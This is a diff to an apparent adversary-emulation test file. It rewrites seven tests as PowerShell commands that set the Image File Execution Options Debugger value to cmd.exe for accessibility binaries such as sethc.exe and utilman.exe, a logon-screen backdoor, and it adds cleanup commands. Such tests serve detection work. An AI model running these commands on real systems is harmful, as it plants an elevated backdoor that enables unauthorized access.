@@ -16,10 +16,24 @@ atomic_tests:
       default: osk.exe
 
   executor:
-    name: command_prompt
+    name: powershell
     elevation_required: true
     command: |
-      reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
+      $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe"
+      $Value = "C:\windows\system32\cmd.exe"
+      $Name = "Debugger"
+      IF(!(Test-Path $registryPath))
+       {
+        New-Item -Path $registryPath -Force
+        New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+       }
+      ELSE
+       {
+        New-ItemProperty -Path $registryPath -Name $name -Value $Value
+       }
+    cleanup_command: |
+      reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /f
+
 
 - name: Attaches Command Prompt As Debugger To Process - sethc
   description: |
@@ -34,10 +48,23 @@ atomic_tests:
       default: sethc.exe
 
   executor:
-    name: command_prompt
+    name: powershell
     elevation_required: true
     command: |
-      reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
+      $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
+      $Value = "C:\windows\system32\cmd.exe"
+      $Name = "Debugger"
+      IF(!(Test-Path $registryPath))
+       {
+        New-Item -Path $registryPath -Force
+        New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+       }
+      ELSE
+       {
+        New-ItemProperty -Path $registryPath -Name $name -Value $Value
+       }
+    cleanup_command: |
+      reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /f
 
 - name: Attaches Command Prompt As Debugger To Process - utilman
   description: |
@@ -52,10 +79,23 @@ atomic_tests:
       default: utilman.exe
 
   executor:
-    name: command_prompt
+    name: powershell
     elevation_required: true
     command: |
-      reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
+      $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe"
+      $Value = "C:\windows\system32\cmd.exe"
+      $Name = "Debugger"
+      IF(!(Test-Path $registryPath))
+       {
+        New-Item -Path $registryPath -Force
+        New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+       }
+      ELSE
+       {
+        New-ItemProperty -Path $registryPath -Name $name -Value $Value
+       }
+    cleanup_command: |
+      reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /f
 
 - name: Attaches Command Prompt As Debugger To Process - magnify
   description: |
@@ -70,10 +110,23 @@ atomic_tests:
       default: magnify.exe
 
   executor:
-    name: command_prompt
+    name: powershell
     elevation_required: true
     command: |
-      reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
+      $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe"
+      $Value = "C:\windows\system32\cmd.exe"
+      $Name = "Debugger"
+      IF(!(Test-Path $registryPath))
+       {
+        New-Item -Path $registryPath -Force
+        New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+       }
+      ELSE
+       {
+        New-ItemProperty -Path $registryPath -Name $name -Value $Value
+       }
+    cleanup_command: |
+      reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger /f
 
 - name: Attaches Command Prompt As Debugger To Process - narrator
   description: |
@@ -88,10 +141,24 @@ atomic_tests:
       default: narrator.exe
 
   executor:
-    name: command_prompt
+    name: powershell
     elevation_required: true
     command: |
-      reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
+      $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe"
+      $Value = "C:\windows\system32\cmd.exe"
+      $Name = "Debugger"
+      IF(!(Test-Path $registryPath))
+       {
+        New-Item -Path $registryPath -Force
+        New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+       }
+      ELSE
+       {
+        New-ItemProperty -Path $registryPath -Name $name -Value $Value
+       }
+    cleanup_command: |
+      reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe" /v Debugger /f
+
 
 - name: Attaches Command Prompt As Debugger To Process - DisplaySwitch
   description: |
@@ -106,10 +173,24 @@ atomic_tests:
       default: DisplaySwitch.exe
 
   executor:
-    name: command_prompt
+    name: powershell
     elevation_required: true
     command: |
-      reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
+      $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe"
+      $Value = "C:\windows\system32\cmd.exe"
+      $Name = "Debugger"
+      IF(!(Test-Path $registryPath))
+       {
+        New-Item -Path $registryPath -Force
+        New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+       }
+      ELSE
+       {
+        New-ItemProperty -Path $registryPath -Name $name -Value $Value
+       }
+    cleanup_command: |
+      reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe" /v Debugger /f
+
 
 - name: Attaches Command Prompt As Debugger To Process - AtBroker
   description: |
@@ -124,7 +205,20 @@ atomic_tests:
       default: atbroker.exe
 
   executor:
-    name: command_prompt
+    name: powershell
     elevation_required: true
     command: |
-      reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
+      $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\atbroker.exe"
+      $Value = "C:\windows\system32\cmd.exe"
+      $Name = "Debugger"
+      IF(!(Test-Path $registryPath))
+       {
+        New-Item -Path $registryPath -Force | Out-Null
+        New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+       }
+      ELSE
+       {
+        New-ItemProperty -Path $registryPath -Name $name -Value $Value
+       }
+    cleanup_command: |
+      reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\atbroker.exe" /v Debugger /f
